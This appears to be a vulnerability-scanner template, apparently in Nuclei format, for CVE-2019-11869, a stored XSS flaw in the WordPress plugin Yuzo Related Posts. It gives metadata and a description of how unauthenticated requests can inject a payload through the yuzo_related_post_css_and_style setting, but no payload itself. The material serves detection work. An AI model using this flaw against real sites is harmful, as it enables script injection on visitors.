id: CVE-2019-11869

info:
  name: Yuzo Related Posts plugin XSS
  author: ganofins
  severity: medium
  description: |
    The Yuzo Related Posts plugin before 5.12.94 for WordPress has XSS
    because it mistakenly expects that is_admin() verifies that the
    request comes from an admin user (it actually only verifies that the
    request is for an admin page). An unauthenticated attacker can inject
    a payload into the plugin settings, such as the
    yuzo_related_post_css_and_style setting.
